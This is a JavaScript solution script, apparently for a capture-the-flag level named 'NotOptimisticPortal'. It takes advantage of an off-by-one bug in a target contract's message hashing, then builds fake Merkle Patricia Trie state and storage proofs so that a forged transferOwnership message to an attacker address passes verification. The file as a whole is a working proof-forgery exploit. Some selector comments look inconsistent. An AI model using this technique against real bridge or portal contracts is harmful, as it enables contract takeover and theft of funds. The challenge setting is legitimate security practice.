/**
 * @file generate.js
 * @description MPT (Merkle Patricia Trie) Proof Generator for L40 NotOptimisticPortal.
 * @dev Computes the exact `messageSlot` to trigger the off-by-one error in the target contract,
 *      then builds a minimal fake L2 state trie and storage trie to generate valid inclusion proofs.
 */

const { Trie } = require('@ethereumjs/trie');
const { RLP } = require('@ethereumjs/rlp');
const { bytesToHex, hexToBytes } = require('@ethereumjs/util');
const { ethers } = require('ethers');

async function generate() {
    // ============================================================================
    // 1. CONFIGURATION & ADDRESSES
    // ============================================================================
    const PORTAL_ADDRESS = "0x842ddF18D79b9aC3ff43BD852A00bfB2316655e9"; 
    const EXPLOIT_ADDRESS = "0x65bC188aE13e43dc74cDe9827138f02021d5f579"; 
    const PLAYER_ADDRESS = "0x4e870C7970e59b2e28069dF591565Bf077f0a195"; 

    if (EXPLOIT_ADDRESS === "0x...") {
        console.log("[!] Please provide PORTAL_ADDRESS, EXPLOIT_ADDRESS, and PLAYER_ADDRESS.");
        return;
    }

    const L2_TARGET = "0x4242424242424242424242424242424242424242";
    const amount = ethers.parseEther("1");
    const salt = ethers.ZeroHash;
    const tokenReceiver = PLAYER_ADDRESS;

    // ============================================================================
    // 2. PAYLOAD CONSTRUCTION & OFF-BY-ONE EXPLOIT
    // ============================================================================
    
    // Command 1: transferOwnership(address) -> selector 0x3a69197e
    const transferOwnershipData = "0x3a69197e" + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [EXPLOIT_ADDRESS]).slice(2);
    // Command 2: updateSequencer -> selector 0x3a69197e + 01
    const command1Data = "0x3a69197e01";

    // Exploit: The off-by-one bug in the contract loop `for(i=0; i < length - 1; i++)`
    // causes the 3rd array element to be ignored in the hash calculation.
    const messageReceivers = [PORTAL_ADDRESS, EXPLOIT_ADDRESS, EXPLOIT_ADDRESS];
    const messageDatas = [transferOwnershipData, command1Data, "0x"]; 

    let messageReceiversAccumulatedHash = ethers.ZeroHash;
    let messageDatasAccumulatedHash = ethers.ZeroHash;

    // Simulate the exact flawed hashing mechanism of the target contract
    for (let i = 0; i < messageReceivers.length - 1; i++) {
        messageReceiversAccumulatedHash = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
            ["bytes32", "address"], [messageReceiversAccumulatedHash, messageReceivers[i]]
        ));
        messageDatasAccumulatedHash = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
            ["bytes32", "bytes"], [messageDatasAccumulatedHash, messageDatas[i]]
        ));
    }

    // Final message slot mapped in the storage root
    const messageSlot = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256", "bytes32", "bytes32", "uint256"],
        [tokenReceiver, amount, messageReceiversAccumulatedHash, messageDatasAccumulatedHash, salt]
    ));

    // ============================================================================
    // 3. MERKLE PATRICIA TRIE CONSTRUCTION
    // ============================================================================

    // Build the Storage Trie containing the execution slot set to true (0x01)
    const storageTrie = new Trie({ useKeyHashing: true });
    await storageTrie.put(hexToBytes(messageSlot), hexToBytes("0x01"));
    const storageRoot = bytesToHex(storageTrie.root());

    // Build the Account State
    // Format: [nonce, balance, storageRoot, codeHash]
    const nonce = hexToBytes("0x00");
    const balance = hexToBytes("0x00");
    const codeHash = hexToBytes(ethers.keccak256("0x"));
    const accountState = [nonce, balance, hexToBytes(storageRoot), codeHash];
    const accountStateRlp = RLP.encode(accountState);

    // Build the State Trie containing the targeted L2 account
    const stateTrie = new Trie({ useKeyHashing: true });
    await stateTrie.put(hexToBytes(L2_TARGET), accountStateRlp);
    const stateRoot = bytesToHex(stateTrie.root());

    // ============================================================================
    // 4. PROOF GENERATION & OUTPUT
    // ============================================================================

    const storageProof = await storageTrie.createProof(hexToBytes(messageSlot));
    const stateProof = await stateTrie.createProof(hexToBytes(L2_TARGET));

    console.log("=== EXPLOITSCRIPT MPT PROOFS ===");
    console.log(`bytes32 stateRoot = ${stateRoot};`);
    console.log(`bytes memory stateTrieProof = hex"${bytesToHex(RLP.encode(stateProof)).slice(2)}";`);
    console.log(`bytes memory storageTrieProof = hex"${bytesToHex(RLP.encode(storageProof)).slice(2)}";`);
    console.log(`bytes memory accountStateRlp = hex"${bytesToHex(accountStateRlp).slice(2)}";`);
}

generate().catch(console.error);